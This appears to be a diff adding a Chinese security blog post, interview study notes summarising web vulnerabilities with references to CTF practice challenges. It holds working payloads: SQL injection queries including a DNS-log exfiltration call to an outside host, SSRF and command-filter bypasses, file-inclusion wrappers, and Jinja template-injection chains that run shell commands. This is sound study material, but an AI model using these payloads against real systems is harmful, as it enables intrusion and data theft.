@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="web漏洞总结 for 秋招">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web漏洞总结">
+<meta property="og:url" content="http://example.com/2023/09/17/24%E5%B1%8A%E7%A7%8B%E6%8B%9B/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="web漏洞总结 for 秋招">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-09-17T03:21:55.000Z">
+<meta property="article:modified_time" content="2024-05-27T08:03:23.630Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/09/17/24%E5%B1%8A%E7%A7%8B%E6%8B%9B/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web漏洞总结 | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/17/24%E5%B1%8A%E7%A7%8B%E6%8B%9B/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web漏洞总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-09-17 11:21:55" itemprop="dateCreated datePublished" datetime="2023-09-17T11:21:55+08:00">2023-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-27 16:03:23" itemprop="dateModified" datetime="2024-05-27T16:03:23+08:00">2024-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/24%E5%B1%8A%E7%A7%8B%E6%8B%9B/" itemprop="url" rel="index"><span itemprop="name">24届秋招</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>web漏洞总结 for 秋招</p>
+<span id="more"></span>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>原理：未对用户输入导致攻击者能够通过拼接SQL语句获取到敏感信息，或者执行带有攻击性的操作。</p>
+<p>危害：数据泄露、数据篡改、getshell、提权</p>
+<p>场景：与数据库有交互的场景都有可能，如登录、查询</p>
+<p>防御：参数化查询、输入验证和过滤、数据库最小权限、不打印错误处理、</p>
+<p>绕过：宽字节编码</p>
+<h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ul>
+<li><p>union联合注入：需要有结果回显，确定回显的位置</p>
+</li>
+<li><p>报错注入：需要有报错提示</p>
+<ul>
+<li>floor 主键重复</li>
+<li>updatexml、extractvalue xpath报错</li>
+</ul>
+</li>
+<li><p>布尔盲注：if，需要正常和异常返回的页面不一样</p>
+</li>
+<li><p>时间盲注：sleep，返回内容一样，时间不一样</p>
+</li>
+<li><p>二次注入：首先将恶意语句写入数据库，然后取出数据时触发SQL注入。sqlilabs less-24</p>
+</li>
+<li><p>dnslog：只适用于Windows，UNC路径，结合load_file函数使用，请求远程文件时会用到DNS解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.6.eudspa.dnslog.cn/a&#x27;)))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>中转注入：sqlmap+脚本文件实现自定义的小工具，可解决加解密注入</p>
+</li>
+<li><p>堆叠注入</p>
+</li>
+<li><p>cookie注入</p>
+</li>
+<li><p>宽字节注入：MySQL使用GBK编码，认为两个字节就代表一个汉字，当第一个字节的ASCII码大于128(将数据库、Web程序、操作系统都设置为utf-8)，<strong>适用于后端处理特殊符号时添加反斜杠转义的情况</strong></p>
+</li>
+</ul>
+<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
+<li>判断是否有注入点：提交错误语句查看是否有异常</li>
+<li>判断注入类型，根据是否有回显……</li>
+<li>sqlmap注入&#x2F;利用information_schema逐渐查询（5.0以上才有</li>
+<li>getshell：sqlmap拿到os-shell&#x2F;SQL Server有xp_cmdshell，可以直接执行系统命令&#x2F;MySQL通过上传文件（需要绝对路径和写权限），反弹shell</li>
+<li>提权 <ol>
+<li>UDF：用户自定义函数</li>
+<li>MOF：特定目录下的mof文件会以系统权限定时执行</li>
+</ol>
+</li>
+</ol>
+<h4 id="常用函数-参数-文件"><a href="#常用函数-参数-文件" class="headerlink" title="常用函数&#x2F;参数&#x2F;文件"></a>常用函数&#x2F;参数&#x2F;文件</h4><p><code>@@datadir</code>：数据库路径，可用于猜测网站路径</p>
+<p><code>secure_file_priv</code>	参数</p>
+<p><code>load_file</code>、<code>into outfile</code>、<code>into dumpfile</code></p>
+<p>my.ini</p>
+<h4 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;...&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;...&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sqlite3"><a href="#sqlite3" class="headerlink" title="sqlite3"></a>sqlite3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(name) from sqlite_master;/*数据库名*/</span><br><span class="line">select group_concat(sql) from sqlite_master;/*建表结构*/</span><br></pre></td></tr></table></figure>
+
+<h3 id="graphql"><a href="#graphql" class="headerlink" title="graphql"></a>graphql</h3><p>内省机制查询所有</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;\n    query IntrospectionQuery &#123;\n      __schema &#123;\n        \n        queryType &#123; name &#125;\n        mutationType &#123; name &#125;\n        subscriptionType &#123; name &#125;\n        types &#123;\n          ...FullType\n        &#125;\n        directives &#123;\n          name\n          description\n          \n          locations\n          args &#123;\n            ...InputValue\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n\n    fragment FullType on __Type &#123;\n      kind\n      name\n      description\n      \n      fields(includeDeprecated: true) &#123;\n        name\n        description\n        args &#123;\n          ...InputValue\n        &#125;\n        type &#123;\n          ...TypeRef\n        &#125;\n        isDeprecated\n        deprecationReason\n      &#125;\n      inputFields &#123;\n        ...InputValue\n      &#125;\n      interfaces &#123;\n        ...TypeRef\n      &#125;\n      enumValues(includeDeprecated: true) &#123;\n        name\n        description\n        isDeprecated\n        deprecationReason\n      &#125;\n      possibleTypes &#123;\n        ...TypeRef\n      &#125;\n    &#125;\n\n    fragment InputValue on __InputValue &#123;\n      name\n      description\n      type &#123; ...TypeRef &#125;\n      defaultValue\n      \n      \n    &#125;\n\n    fragment TypeRef on __Type &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n                ofType &#123;\n                  kind\n                  name\n                  ofType &#123;\n                    kind\n                    name\n                  &#125;\n                &#125;\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &quot;</span><span class="punctuation">,</span><span class="attr">&quot;variables&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;operationName&quot;</span><span class="punctuation">:</span><span class="string">&quot;IntrospectionQuery&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\n __schema&#123;\n types&#123;\n name\n&#125;\n&#125;\n&#125;\n&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\n __type(name:\&quot;User\&quot;)&#123;\n name,\n fields&#123;\n name,\ntype \n&#123;\n name \n&#125;\n&#125;\n&#125;\n&#125;\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>WAF绕过总结：更改提交方法GET&#x2F;POST…、<strong>打乱匹配规则</strong>（大小写混合、解密编码、注释符混用、等价函数替换、特殊符号混用）、借助数据库特性改变语法、HTTP参数污染</p>
+<p>WAF可能过滤information_schema，解决：</p>
+<ol>
+<li><p>innodb（5.6以上） ，查不到列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(database_name) from mysql.innodb_table_stats;</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>sys，也查不到列</p>
+</li>
+</ol>
+<p>无列名注入：</p>
+<ol>
+<li>join</li>
+<li>子查询</li>
+</ol>
+<p>过滤查询关键字select：</p>
+<ol>
+<li>堆叠注入，show查询数据库+表+列</li>
+<li>handler查询</li>
+<li>设置预编译语句，预编译语句中使用concat绕过过滤</li>
+</ol>
+<p>过滤空格：</p>
+<ol>
+<li><code>%a0</code></li>
+<li>注释符<code>/**/</code></li>
+</ol>
+<h3 id="题型收集"><a href="#题型收集" class="headerlink" title="题型收集"></a>题型收集</h3><ol>
+<li>攻防世界-ezsqli（无列名注入）</li>
+<li>攻防世界-filemanager（二次注入）</li>
+<li>攻防世界-supersqli（堆叠注入；select绕过）</li>
+<li>攻防世界-Zhuanxv（hsql注入）</li>
+<li>攻防世界-NewCenter</li>
+<li>攻防世界-FlatScience（sqlite3注入）</li>
+<li>攻防世界-Background_Management_System（二次注入</li>
+<li>bugku-滴!晨跑打卡（空格过滤</li>
+</ol>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>原理：未对用户输入进行正确过滤，导致攻击者能够注入恶意脚本代码且被执行</p>
+<p>危害：窃取敏感信息、网络钓鱼、网页挂马、篡改页面、网络钓鱼、结合CSRF</p>
+<p>场景：所有用户能够进行输入的地方，如富文本编辑器、</p>
+<p>防御：HttpOnly、安全编码（输入输出）、CSP Header</p>
+<p>绕过：模糊测试</p>
+<h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><ul>
+<li>反射型：会经过服务器（构造恶意链接，payload藏于get参数中，诱导受害者点击</li>
+<li>存储型：会长久地存储在服务器中（留言板</li>
+<li>DOM型：只在浏览器端执行（该网站允许用户自定义js</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>原理：未对发起操作的用户的身份进行正确校验，导致用户在不知情的情况下执行恶意操作</p>
+<p>危害：盗用身份、伪造交易</p>
+<p>场景：发布留言、支付</p>
+<p>防御：验证referer（白名单）、验证token、同源策略、不用GET请求、添加确认</p>
+<p>绕过：DNS重绑定可以绕过同源策略</p>
+<h2 id="SSFR"><a href="#SSFR" class="headerlink" title="SSFR"></a>SSFR</h2><p>原理：服务器端提供发起请求的功能，攻击者拼接恶意指令</p>
+<p>危害：命令执行、文件读取、本地和内网端口和服务扫描</p>
+<p>场景：下载远程资源、</p>
+<p>防御：过滤对内网地址的访问</p>
+<p>绕过：DNS重绑定</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>file_get_contents</code></p>
+<p><code>sockopen</code></p>
+<p><code>curl_exec</code></p>
+<h3 id="常用伪协议"><a href="#常用伪协议" class="headerlink" title="常用伪协议"></a>常用伪协议</h3><p><code>file:///</code></p>
+<p><code>dict://</code></p>
+<p><code>php://</code></p>
+<p><code>gopher://</code></p>
+<h3 id="绕过姿势-1"><a href="#绕过姿势-1" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>URL绕过：</p>
+<ul>
+<li>检测URL中必需包括某域名，@绕过。<a target="_blank" rel="noopener" href="http://xxx.com@127.0.0.1/flag">http://xxx.com@127.0.0.1/flag</a> &#x3D;&#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag">http://127.0.0.1/flag</a></li>
+<li>注册相关子域名</li>
+</ul>
+<p>IP绕过：</p>
+<ul>
+<li><p>进制转换：<code>0177.0.0.1</code>、<code>0x7f.0.0.1</code>、<code>2130706433</code></p>
+</li>
+<li><p>意义等同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">http://0/</span><br><span class="line">http://127.0.1/</span><br><span class="line">短链接</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重定向：服务器直接访问的网址是正常的，但是该网页有重定向到127.0.0.1的操作</p>
+</li>
+<li><p>DNS重绑定：服务器校验域名解析IP时，DNS解析到一个合法IP，但是有效期短，因此正式访问时会重新解析，此时会解析到127.0.0.1</p>
+</li>
+</ul>
+<h3 id="题型收集-1"><a href="#题型收集-1" class="headerlink" title="题型收集"></a>题型收集</h3><ol>
+<li>攻防世界-Cat</li>
+<li>攻防世界-ics-02</li>
+</ol>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>原理：对上传的文件没有进行正确的过滤，导致用户可以上传恶意文件</p>
+<p>危害：后门文件、病毒程序</p>
+<p>场景：能上传文件的地方（上传附件、上传头像</p>
+<p>防御：上传目录无执行权限、白名单文件后缀、不暴露上传目录路径、改写文件名</p>
+<p>绕过：双写、大小写、结合解析漏洞</p>
+<h3 id="绕过姿势-2"><a href="#绕过姿势-2" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>phtml：script标签绕过<code>&lt;?</code></p>
+<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><ol>
+<li><p>IIS 6.0 </p>
+<ol>
+<li>目录解析 <code>/xxx.asp/sss.jpg</code>：sss.jpg在xxx.asp目录下会被当做asp解析</li>
+<li>文件解析 <code>/xxx.asp;.jpg</code>：分号后面的不被解析</li>
+<li>除了asp外IIS 6.0默认的可执行文件：asa, cer, cdx</li>
+</ol>
+</li>
+<li><p>IIS 7.0&#x2F;IIS 7.5&#x2F;Ngnix&lt;8.03 畸形解析漏洞（Fast-CGI开启时</p>
+<ol>
+<li>上传xxx.jpg，其中包含php代码</li>
+<li>访问xxx.jpg&#x2F;1.php即可把jpg当作php执行</li>
+</ol>
+</li>
+<li><p>Ngnix&lt;8.03  空字节代码执行漏洞</p>
+<ol>
+<li>上传xxx.jpg，其中包含php代码</li>
+<li>访问xxx.jpg%00.php即可把jpg当作php执行</li>
+</ol>
+</li>
+<li><p>Apache解析漏洞：Apache 是从右到左开始判断解析,如果为<strong>不可识别</strong>解析,就再往左判断。eg.test.php.x1.x2.x3</p>
+</li>
+</ol>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>原理：服务器端引入的文件是攻击者能够控制的恶意文件</p>
+<p>利用条件：<code>allow_url_fopen</code>和<code>allow_url_include</code>开启</p>
+<p>危害：与文件上传可结合</p>
+<h4 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h4><p>PHP：include、require、fopen、readfile</p>
+<h4 id="读取协议"><a href="#读取协议" class="headerlink" title="读取协议"></a>读取协议</h4><p>file协议：读取绝对路径的文件</p>
+<p>php伪协议：</p>
+<ul>
+<li>php:&#x2F;&#x2F;input：执行php代码，适用于post和file_get_contents</li>
+<li>php:&#x2F;&#x2F;filter：读取源码，常用base64编码源码，<code>?filename=php://filter/read=convert.base64-encode/resource=./1.php</code>，resource可以说绝对路径也可以是相对</li>
+</ul>
+<p>data协议：data:&#x2F;&#x2F;text&#x2F;plain;base64,…..&#x3D;&#x3D;</p>
+<h3 id="题型收集-2"><a href="#题型收集-2" class="headerlink" title="题型收集"></a>题型收集</h3><ol>
+<li>攻防世界-Web_php_include</li>
+<li>攻防世界-warmup</li>
+<li>攻防世界-wzsc_文件上传（条件竞争）</li>
+<li>攻防世界_file_include</li>
+</ol>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>原理：服务器能够接收攻击者反序列化过的字符串，导致攻击者能够控制程序中的变量或者操作</p>
+<ul>
+<li>魔术方法：类中使用某些函数会触发魔术方法，如果存在一些敏感功能如文件读取，加上攻击者可以控制变量，可能造成任意文件读取漏洞</li>
+</ul>
+<p>场景：篡改受害人的一些数据（这些数据会经过序列化和反序列化的操作</p>
+<h3 id="相关函数-2"><a href="#相关函数-2" class="headerlink" title="相关函数"></a>相关函数</h3><p>PHP：serialize, unserialize，魔术方法（<code>__construct</code>, <code>__sleep</code>, <code>__wakeup</code></p>
+<p>Java：writeObject，readObject（JSON反序列化、JDBC反序列化</p>
+<h3 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h3><p>Apache Shiro对cookie的处理涉及反序列化（特征：cookie名为rememberMe）</p>
+<p>处理过程：命令→序列化→aes加密→base64编码→rememberme</p>
+<p>利用条件：获取aes-key，构造恶意命令按照以上处理过程完成后上传到服务器端，服务器反序列化后执行恶意命令</p>
+<p>相关知识点：Java，aes，cookie、反序列化</p>
+<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>php session储存在文件中</p>
+<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></p>
+<p><code>unserialize(filter(serialize($a)))</code>，序列化与反序列化中的filter函数，替换的字符串长度前后不一致会造成反序列识别出现bug</p>
+<ol>
+<li>过滤后字符串变长：指定长度的字符识别完后，剩余的字符被当作变量</li>
+<li>过滤后字符串变短：导致后面的变量被当作字符串，构造后面的变量为危险变量完成替换</li>
+</ol>
+<h3 id="题型收集-3"><a href="#题型收集-3" class="headerlink" title="题型收集"></a>题型收集</h3><ol>
+<li>攻防世界-unserialize3</li>
+<li>攻防世界-Web_php_unserialize</li>
+<li>bugku-逃逸-nuaactf</li>
+</ol>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="php相关函数"><a href="#php相关函数" class="headerlink" title="php相关函数"></a>php相关函数</h3><p>system</p>
+<p>shell_exec</p>
+<p>exec</p>
+<p>eval</p>
+<h3 id="绕过姿势-3"><a href="#绕过姿势-3" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>空格绕过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键词绕过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fl\ag</span><br><span class="line">y=ag;x=fl;$x$y #变量替换</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>原理：攻击者能够控制要通过模板引擎渲染的数据，可以让服务器执行一些命令</p>
+<p>危害：泄露敏感信息</p>
+<p>测试：数学表达式49</p>
+<h3 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用方法</span></span><br><span class="line">__class__	<span class="comment">#返回调用的参数类型。</span></span><br><span class="line">__base__	<span class="comment">#返回基类</span></span><br><span class="line">__mro__		<span class="comment">#允许我们在当前Python环境下追溯继承树</span></span><br><span class="line">__subclasses__()	<span class="comment">#返回子类</span></span><br><span class="line">__init__ 	<span class="comment">#返回类的初始化方法 </span></span><br><span class="line">__globals__  <span class="comment">#对包含函数全局变量的字典的引用 python3</span></span><br><span class="line">__dict__   <span class="comment">#返回类中的函数和属性，父类子类互不影响</span></span><br><span class="line"><span class="comment"># 常用函数</span></span><br><span class="line">file</span><br><span class="line">popen	</span><br><span class="line"><span class="comment">#&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span></span><br><span class="line">os.popen	</span><br><span class="line"><span class="comment">#&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span></span><br><span class="line"><span class="comment">#&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span></span><br><span class="line">os.system	<span class="comment"># &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span></span><br><span class="line"><span class="built_in">exec</span></span><br><span class="line"><span class="built_in">eval</span></span><br><span class="line"><span class="comment">#&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;</span></span><br><span class="line"><span class="comment"># 绕过关键词过滤</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__bases__[<span class="number">0</span>][<span class="string">&#x27;__subcl&#x27;</span>+<span class="string">&#x27;asses__&#x27;</span>]()[]&#125;&#125;	<span class="comment"># 字符串拼接</span></span><br></pre></td></tr></table></figure>
+
+<p>可通过脚本遍历获取想要的类的位置，python or 模板脚本 or burp爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
